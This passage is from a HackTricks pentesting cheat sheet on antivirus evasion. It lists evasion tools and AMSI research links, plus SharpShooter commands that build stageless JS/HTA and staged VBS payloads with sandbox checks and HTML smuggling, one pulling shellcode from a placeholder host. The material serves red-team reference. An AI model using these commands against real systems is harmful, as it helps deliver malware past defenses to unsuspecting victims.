[https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)

https://github.com/l0ss/Grouper2

{% embed url="http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html" %}

{% embed url="http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/" %}
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### もっと

{% embed url="https://github.com/persianhydra/Xeexe-TopAntivirusEvasion" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ会社**で働いていますか？**HackTricksにあなたの会社を広告したいですか？** または、**最新版のPEASSを入手**したり、**HackTricksをPDFでダウンロード**したいですか？[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見してください。私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS & HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**telegramグループ**](https://t.me/peass)に**参加するか**、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**にフォローしてください。**
* **ハッキングのコツを共有するために、**[**hacktricksリポジトリ**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloudリポジトリ**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出してください。**

</details>
